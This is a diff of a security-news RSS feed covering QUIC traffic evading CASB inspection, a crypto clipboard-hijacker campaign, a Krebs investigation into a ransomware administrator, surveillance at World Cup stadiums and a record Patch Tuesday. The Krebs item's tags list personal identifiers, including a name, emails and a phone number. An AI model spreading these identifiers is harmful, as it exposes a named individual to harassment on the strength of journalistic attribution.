-UDP &amp;nbsp;User Datagram Protocol. A faster, lower-overhead protocol. QUIC runs over UDP, which is why CASB tools built around TCP cannot inspect it.&lt;br /&gt;
-QUIC &amp;nbsp;A modern transport protocol from Google, standardized by the IETF. Runs over UDP and powers HTTP/3. Not an acronym, just a name. Designed for performance, not to bypass security controls.&lt;br /&gt;
-HTTP/3 &amp;nbsp;The third major version of the Hypertext Transfer Protocol, the language of the web. Uses QUIC as its transport. Supported by most large platforms.&lt;br /&gt;
-SWG &amp;nbsp;Secure Web Gateway. A network-level security tool that filters internet traffic, often deployed alongside a CASB.&lt;br /&gt;
-DLP &amp;nbsp;Data Loss Prevention. Tools and policies designed to stop sensitive data from leaving an organization without authorization.&lt;br /&gt;
-SaaS &amp;nbsp;Software as a Service. Cloud-based software accessed through a browser: email, productivity tools, AI services.&lt;br /&gt;
-Endpoint &amp;nbsp;Any device (laptop, desktop, phone) connected to a corporate network or running corporate security software.&lt;br /&gt;
-Telemetry &amp;nbsp;Detailed data automatically collected from systems about their activity and connections. Used by security teams to investigate incidents.&lt;br /&gt;
-URL &amp;nbsp;Uniform Resource Locator. A web address, what you type into a browser&amp;rsquo;s address bar.&lt;br /&gt;
-DNS &amp;nbsp;Domain Name System. The internet&amp;rsquo;s directory. Translates web addresses into numeric IP addresses computers use to find servers. Modern DNS records can also signal which protocols a server supports, including QUIC.&lt;br /&gt;
-Protocol &amp;nbsp;A set of rules for how data travels across a network. TCP and UDP are both transport protocols, but they work very differently.&lt;/p&gt;
-
-&lt;p&gt;References&lt;br /&gt;
-1. &amp;nbsp;Internet Engineering Task Force. QUIC: A UDP-Based Multiplexed and Secure Transport. RFC 9000. May 2021. &amp;nbsp;rfc-editor.org/rfc/rfc9000&lt;br /&gt;
-2. &amp;nbsp;Palo Alto Networks. Create the Application Block Rules: Block QUIC. Internet Gateway Best Practices. &amp;nbsp;docs.paloaltonetworks.com&lt;br /&gt;
-3. &amp;nbsp;Forcepoint. QUIC (UDP) Protocol Traffic Can Bypass Forcepoint Cloud and On-Premises Proxies. Support Advisory. &amp;nbsp;support.forcepoint.com/s/article/000015410&lt;br /&gt;
-4. &amp;nbsp;Cloudflare. HTTP/3 Inspection, Cloudflare One Documentation. Accessed June 2026. &amp;nbsp;developers.cloudflare.com&lt;br /&gt;
-5. &amp;nbsp;Keep Aware. 2026 Browser Security Report: Enterprise Blind Spots and AI Risk. March 2026. Coverage via BleepingComputer. &amp;nbsp;bleepingcomputer.com&lt;br /&gt;
-6. &amp;nbsp;Endpoint Protector. Why Browser-Based Workflows Break Traditional DLP. February 2026. &amp;nbsp;endpointprotector.com&lt;br /&gt;
-7. &amp;nbsp;Netskope Threat Labs. Cloud and Threat Report: 2026. January 2026. &amp;nbsp;netskope.com&lt;br /&gt;
-8. &amp;nbsp;Code42 Software. 2024 Data Exposure Report. March 2024. &amp;nbsp;globenewswire.com&lt;br /&gt;
-9. &amp;nbsp;Internet Engineering Task Force. Service Binding and Parameter Specification via the DNS (SVCB and HTTPS Resource Records). RFC 9460. November 2023. &amp;nbsp;rfc-editor.org/info/rfc9460&lt;br /&gt;
-10. &amp;nbsp;Gartner. Definition of Cloud Access Security Brokers (CASBs). Gartner IT Glossary. &amp;nbsp;gartner.com&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/33084</guid></item><item><title>From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker</title><link>https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/</link><description>&lt;p&gt;Key Points Introduction In this research, we analyze a clipboard hijacker campaign that is hidden inside a collection of “solutions” and “tools” that claim to give users an unfair advantage. These offers include Solana and Pump.fun sniper bots (automated tools that try to buy new tokens or meme coins faster than other traders), Aviator Predictor [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-novo-nordisk-1-3tb-theft-25m-demand-emea/"&gt;Ozempic Maker Novo Nordisk Confirms Security Incident After $25M Hacker Demand&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4362687</guid><category>Artificial Intelligence</category><category>Cybersecurity</category><category>Data Breaches</category><category>EMEA</category><category>EU</category><category>International</category><category>News</category><category>Security</category><category>ai models</category><category>clinical trial data</category><category>cybersecurity</category><category>data breach</category><category>editors picks</category><category>emea</category><category>extortion</category><category>fulcrumsec</category><category>healthcare security</category><category>novo nordisk</category><category>pharmaceutical data</category><category>ransomware</category></item><item><title>From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker</title><link>https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/</link><description>&lt;p&gt;Key Points Introduction In this research, we analyze a clipboard hijacker campaign that is hidden inside a collection of “solutions” and “tools” that claim to give users an unfair advantage. These offers include Solana and Pump.fun sniper bots (automated tools that try to buy new tokens or meme coins faster than other traders), Aviator Predictor [&amp;#8230;]&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/"&gt;From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;
 
 
@@ -8137,7 +8129,7 @@ def _msgpack_ext_hook(code: int, data: bytes) -&gt; Any:
 &lt;p&gt;Another important dynamic is that the Russian government generally either &lt;a href="https://www.recordedfuture.com/research/dark-covenant-3-controlled-impunity-and-russias-cybercriminals" rel="noopener" target="_blank"&gt;co-opts or ignores&lt;/a&gt; cybercriminal activity within its borders so long as the hackers do not steal from or attack Russian businesses and citizens. As a result, successful cybercriminals in Russia are usually insulated from prosecution and arrest by foreign law enforcement agencies provided they occasionally pay off the right people and do not travel abroad. And cybercriminals who intend to strictly adhere to those unwritten rules may (at least initially) be less concerned about covering their tracks online.&lt;/p&gt;
 &lt;p&gt;But the simplest explanation is that cybercriminals of all nationalities tend to make a number of basic operational security mistakes early in their careers, when they are less savvy and have far less to lose by their carelessness. A review of Hastalamuerte&amp;#8217;s early posts on the crime forums (circa 2019-2020) shows a relatively unsophisticated and low-skilled hacker still trying to learn the ropes and earn a positive reputation on these communities.&lt;/p&gt;
 &lt;p&gt;For example, in June 2020 Hastalamuerte&amp;#8217;s Telegram account joined a multi-month training program (@pntst) to learn how to use popular penetration testing tools, and their candid posts to this hacker training camp show Hastalamuerte struggling to use these tools effectively. A Google-translated record of Hastalmuerte&amp;#8217;s posts to @pntst is &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2026/06/pntst-chat.txt" rel="noopener" target="_blank"&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Update, June 11, 10:23 a.m. ET:&lt;/strong&gt;  The threat research group &lt;strong&gt;PRODAFT&lt;/strong&gt; has released &lt;a href="https://catalyst.prodaft.com/public/report/inside-the-phantom-mantis-operation/overview#paragraph-1077|172" rel="noopener" target="_blank"&gt;a detailed writeup&lt;/a&gt; on the history and current operations of The Gentlemen. PRODAFT said its findings match the same persona with &amp;#8220;high confidence,&amp;#8221; and found the administrator (Zeta88/Hastalamuerte) supplies affiliates with initial access directly, primarily Fortinet SSL-VPN credentials obtained through brute-force attacks or sourced from the group&amp;#8217;s own leak database. They also discovered the administrator is using AI to develop and maintain the ransomware and associated tooling, as well as to assist with post-exploitation activity.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=73768</guid><category>Breadcrumbs</category><category>Ne'er-Do-Well News</category><category>Ransomware</category><category>79127650004</category><category>Alexander Andreevich Yapaev</category><category>bu4vs@mail.ru</category><category>Constella Intelligence</category><category>Epieos</category><category>Flashpoint</category><category>Hastalamuerte</category><category>hastalamuerte1488@protonmail.com</category><category>Intel 471</category><category>SantaMuerte</category><category>The Gentlemen ransomware</category></item><item><title>Wrongful Arrest Exposes Failures in One of the Oldest Police Face-Recognition Tools in the US</title><link>https://www.wired.com/story/wrongful-arrest-tests-one-of-the-oldest-police-face-recognition-tools-in-the-us/</link><description>The ACLU is suing two Florida police departments over the arrest of a Fort Myers man in a child-abduction case, saying officers treated a flawed face-recognition match as a near-certain ID.</description><guid isPermaLink="false">6a29601a2286375b80444c6d</guid><category>Security</category><category>Security / Privacy</category><category>Security / Security News</category><category>privacy</category><category>surveillance</category><category>face recognition</category><category>Police</category><category>Crime</category><category>algorithms</category><category>machine learning</category><category>Face Palm</category></item><item><title>Soccer Fans, You’re Being Watched</title><link>https://www.wired.com/story/soccer-world-cup-biometric-surveillance/</link><description>From anti-drone tech to face recognition, 2026 World Cup stadiums in the US, Canada, and Mexico are subjecting fans to an array of surveillance tech. Here’s what you need to know.</description><guid isPermaLink="false">636299d7a9269ef97e4efe41</guid><category>Security</category><category>Security / Privacy</category><category>face recognition</category><category>biometrics</category><category>privacy</category><category>soccer</category><category>World Cup 2026</category></item><item><title>Mapping Every Flock License Plate Reader Near US World Cup Stadiums</title><link>https://www.wired.com/story/us-world-cup-2026-alpr-camera-stadiums/</link><description>Most US World Cup stadiums are surrounded by surveillance cameras. Want to know if you’re being watched on your way to a match? These maps will help you.</description><guid isPermaLink="false">6a0f1584270531d462da7481</guid><category>Security</category><category>Security / Privacy</category><category>World Cup 2026</category><category>surveillance</category><category>Sports</category><category>privacy</category><category>Police</category><category>cars</category></item><item><title>GenAI Is Both Hunter and Hunted at Pwn2Own Berlin 2026</title><link>https://www.trendmicro.com/en_us/research/26/f/pwn2own-genai.html</link><description>This year’s Pwn2Own competition in Berlin revealed just how much of the AI stack remains exposed -- and the gap between what these tools promise and what they can withstand point to the fragile security foundations underneath.</description><guid isPermaLink="false">urn:uuid:33cf8e57-a765-835b-8499-6cee5890779a</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Artificial Intelligence (AI)</category></item><item><title>A Record-Breaking Patch Tuesday for June 2026</title><link>https://krebsonsecurity.com/2026/06/a-record-breaking-patch-tuesday-for-june-2026/</link><description>Microsoft today released software updates to plug nearly 200 security holes across its Windows operating systems and supported software, a record number of fixes for the company's monthly Patch Tuesday cycle. Nearly three dozen of those bugs earned Microsoft's most dire "critical" rating, and exploit code for at least three of the weaknesses is now publicly available.</description><content:encoded>&lt;p&gt;&lt;strong&gt;Microsoft&lt;/strong&gt; today released software updates to plug nearly 200 security holes across its &lt;strong&gt;Windows&lt;/strong&gt; operating systems and supported software, a record number of fixes for the company&amp;#8217;s monthly Patch Tuesday cycle. Nearly three dozen of those bugs earned Microsoft&amp;#8217;s most dire &amp;#8220;critical&amp;#8221; rating, and exploit code for at least three of the weaknesses is now publicly available.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Update, June 11, 10:23 a.m. ET:&lt;/strong&gt;  The threat research group &lt;strong&gt;PRODAFT&lt;/strong&gt; has released &lt;a href="https://catalyst.prodaft.com/public/report/inside-the-phantom-mantis-operation/overview#paragraph-1077|172" rel="noopener" target="_blank"&gt;a detailed writeup&lt;/a&gt; on the history and current operations of The Gentlemen. PRODAFT said its findings match the same persona with &amp;#8220;high confidence,&amp;#8221; and found the administrator (Zeta88/Hastalamuerte) supplies affiliates with initial access directly, primarily Fortinet SSL-VPN credentials obtained through brute-force attacks or sourced from the group&amp;#8217;s own leak database. They also discovered the administrator is using AI to develop and maintain the ransomware and associated tooling, as well as to assist with post-exploitation activity.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=73768</guid><category>Breadcrumbs</category><category>Ne'er-Do-Well News</category><category>Ransomware</category><category>79127650004</category><category>Alexander Andreevich Yapaev</category><category>bu4vs@mail.ru</category><category>Constella Intelligence</category><category>Epieos</category><category>Flashpoint</category><category>Hastalamuerte</category><category>hastalamuerte1488@protonmail.com</category><category>Intel 471</category><category>SantaMuerte</category><category>The Gentlemen ransomware</category></item><item><title>Wrongful Arrest Exposes Failures in One of the Oldest Police Face-Recognition Tools in the US</title><link>https://www.wired.com/story/wrongful-arrest-tests-one-of-the-oldest-police-face-recognition-tools-in-the-us/</link><description>The ACLU is suing two Florida police departments over the arrest of a Fort Myers man in a child-abduction case, saying officers treated a flawed face-recognition match as a near-certain ID.</description><guid isPermaLink="false">6a29601a2286375b80444c6d</guid><category>Security</category><category>Security / Privacy</category><category>Security / Security News</category><category>privacy</category><category>surveillance</category><category>face recognition</category><category>Police</category><category>Crime</category><category>algorithms</category><category>machine learning</category><category>Face Palm</category></item><item><title>Mapping Every Flock License Plate Reader Near US World Cup Stadiums</title><link>https://www.wired.com/story/us-world-cup-2026-alpr-camera-stadiums/</link><description>Most US World Cup stadiums are surrounded by surveillance cameras. Want to know if you’re being watched on your way to a match? These maps will help you.</description><guid isPermaLink="false">6a0f1584270531d462da7481</guid><category>Security</category><category>Security / Privacy</category><category>World Cup 2026</category><category>surveillance</category><category>Sports</category><category>privacy</category><category>Police</category><category>cars</category></item><item><title>Soccer Fans, You’re Being Watched</title><link>https://www.wired.com/story/soccer-world-cup-biometric-surveillance/</link><description>From anti-drone tech to face recognition, 2026 World Cup stadiums in the US, Canada, and Mexico are subjecting fans to an array of surveillance tech. Here’s what you need to know.</description><guid isPermaLink="false">636299d7a9269ef97e4efe41</guid><category>Security</category><category>Security / Privacy</category><category>face recognition</category><category>biometrics</category><category>privacy</category><category>soccer</category><category>World Cup 2026</category></item><item><title>GenAI Is Both Hunter and Hunted at Pwn2Own Berlin 2026</title><link>https://www.trendmicro.com/en_us/research/26/f/pwn2own-genai.html</link><description>This year’s Pwn2Own competition in Berlin revealed just how much of the AI stack remains exposed -- and the gap between what these tools promise and what they can withstand point to the fragile security foundations underneath.</description><guid isPermaLink="false">urn:uuid:33cf8e57-a765-835b-8499-6cee5890779a</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Artificial Intelligence (AI)</category></item><item><title>A Record-Breaking Patch Tuesday for June 2026</title><link>https://krebsonsecurity.com/2026/06/a-record-breaking-patch-tuesday-for-june-2026/</link><description>Microsoft today released software updates to plug nearly 200 security holes across its Windows operating systems and supported software, a record number of fixes for the company's monthly Patch Tuesday cycle. Nearly three dozen of those bugs earned Microsoft's most dire "critical" rating, and exploit code for at least three of the weaknesses is now publicly available.</description><content:encoded>&lt;p&gt;&lt;strong&gt;Microsoft&lt;/strong&gt; today released software updates to plug nearly 200 security holes across its &lt;strong&gt;Windows&lt;/strong&gt; operating systems and supported software, a record number of fixes for the company&amp;#8217;s monthly Patch Tuesday cycle. Nearly three dozen of those bugs earned Microsoft&amp;#8217;s most dire &amp;#8220;critical&amp;#8221; rating, and exploit code for at least three of the weaknesses is now publicly available.&lt;/p&gt;
 &lt;p&gt;The software giant said in &lt;a href="https://www.microsoft.com/en-us/msrc/blog/2026/05/a-note-on-patch-tuesday" rel="noopener" target="_blank"&gt;a blog post&lt;/a&gt; last month that both its engineers and the security community are increasing using artificial intelligence tools to find bugs, meaning this month&amp;#8217;s heavy Patch Tuesday may start to become the norm, said &lt;strong&gt;Satnam Narang&lt;/strong&gt;, senior staff research engineer at &lt;strong&gt;Tenable&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;&amp;#8220;Some surveys put AI usage among security professionals generally at 90%, so it’s unsurprising that this volume of patches may be the norm,&amp;#8221; Narang said. &amp;#8220;Pandora’s proverbial box has been opened, and as more advanced AI models become available, we expect the norm to continue upward across the board, not just for Patch Tuesday.&amp;#8221;&lt;/p&gt;
 &lt;p&gt;June&amp;#8217;s zero-day bugs include &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-49160" rel="noopener" target="_blank"&gt;CVE-2026-49160&lt;/a&gt;, a denial of service vulnerability affecting a range of web servers, including Microsoft &lt;strong&gt;Internet Information Services&lt;/strong&gt; (IIS). Microsoft says the flaw was reported by OpenAI&amp;#8217;s Codex.&lt;/p&gt;
